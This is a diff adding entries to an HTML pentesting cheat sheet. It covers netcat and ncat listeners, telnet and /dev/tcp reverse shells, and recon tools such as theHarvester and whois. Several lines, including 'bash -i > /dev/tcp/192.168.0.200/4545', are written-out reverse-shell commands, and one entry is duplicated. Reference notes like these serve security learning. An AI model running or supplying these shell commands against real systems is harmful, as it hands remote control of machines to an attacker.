@@ -414,10 +414,121 @@
           <span class="opt">-e <span class="param">file/bin</span>
           <span class="exp">: executes <span class="param">file/bin</span> on connection, can bind/reverse shells </span>
         </span>
-        <br>│<code class="etc">nc -vnlp 5050 -e /bin/bash</code>
+        <br>│<code>nc -vnlp 5050 -e /bin/bash</code>
       </li>
 
       <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">ncat</span>
+        <span class="exp">: exactly line nc, but supports encryption </span>
+        <br>│<code class="etc">generate ssl: $ openssl req -x 509 --newkey rsa 2048 -keyout chave.pem -out cert.pem -days 10</code>
+        <br>│<code>ncat -vnlp 443 --ssl-key <span class="param">name</span>.pem --ssl-cert <span class="param">cert</span>.pem </code>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">telnet</span> <span class="param">dns</span> <span class="param">port</span>
+        <span class="exp">: connects with <span class="param">dns</span>:<span class="param">port</span> line netcat,</span>
+        <br>│ <span class="exp">but a little more shitty</span>
+        <br>│<code>telnet <span class="param">ip1</span> <span class="param">port1</span> | /bin/bash | telnet <span class="param">ip2</span> <span class="param">port2</span></code>
+        <br>│<code class="etc">connects and sends shell to <span class="param">ip1</span> <span class="param">port1</span>, and outputs to <span class="param">ip2</span> <span class="param">port2</span></code>
+        <br>│<code class="etc">OBS: can be the same ip</code>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">/dev/tcp</span>
+        <span class="exp">: easily open tcp ports </span>
+        <br>│<code>echo 'this will be send to the port' > /dev/tcp/192.168.0.200/4545</code>
+        <br>│<code>bash -i > /dev/tcp/192.168.0.200/4545 0>&1 2>&1 </code>
+        <br>│<code class="etc">sends bash to 192.168.0.200:4545 and shows input(0) e error(2) in the output(1)</code>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">/dev/tcp</span>
+        <span class="exp">: easily open tcp ports </span>
+        <br>│<code>echo 'this will be send to the port' > /dev/tcp/192.168.0.200/4545</code>
+        <br>│<code>bash -i > /dev/tcp/192.168.0.200/4545 0>&1 2>&1 </code>
+        <br>│<code class="etc">sends bash to 192.168.0.200:4545 and shows input(0) e error(2) in the output(1)</code>
+      </li>
+
+      <p>│</p>
+      <p>│</p>
+      <p>│ <span class="spacer">aaa</span>┌──────────────────┐</p>
+      ├────┤<h3>Info. gathering</h3> │
+      <p>│ <span class="spacer">aaa</span>└──────────────────┘</p>
+      <p>│</p>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">urlcrazy</span> <span class="param">url</span>
+        <span class="exp">: similar disponible urls </span>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">theHarvester</span>
+        <span class="exp">: cli dorking </span>
+        <br>│ <span class="ident">
+          <span class="opt">-d <span class="param">dns</span></span>
+          <span class="exp">: specifyes dns</span>
+        </span>
+        <br>│ <span class="ident">
+          <span class="opt">-l <span class="param">int</span></span>
+          <span class="exp">: search limit</span>
+        </span>
+        <br>│ <span class="ident">
+          <span class="opt">-b <span class="param">searcher</span></span>
+          <span class="exp">: searcher to use, $theHarvester --help to see all</span>
+        </span>
+        <br>│ <span class="ident">
+          <span class="opt">-f <span class="param">file.html</span></span>
+          <span class="exp">: write output to <span class="param">file.html</span></span>
+        </span>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">exiftool <span class="param">doc</span></span>
+        <span class="exp">: see metadata of <span class="param">doc</span> </span>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">lynx <span class="param">dns</span></span>
+        <span class="exp">: cli browser </span>
+        <br>│ <span class="ident">
+          <span class="opt">--dump </span>
+          <span class="exp">: only outputh the html, no interantion, cool for making scripts</span>
+        </span>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">whois <span class="param">dns</span></span>
+        <span class="exp">: iana whois, via cli </span>
+        <br>│ <span class="ident">
+          <span class="opt">-h <span class="param">url</span></span>
+          <span class="exp">: specifyes a whois searcher,ex: whois.iana.org</span>
+        </span>
+      </li>
+
+      <p>├────────────────────────────────────────────────────────────────</p>
+
+      <li>
+        ├ <span class="cmd">bgpview.io/bgp.net</span>
+        <span class="exp">: websites, info like asn/netblock, if there's a dns </span>
+      </li>
 
 
     </ul>
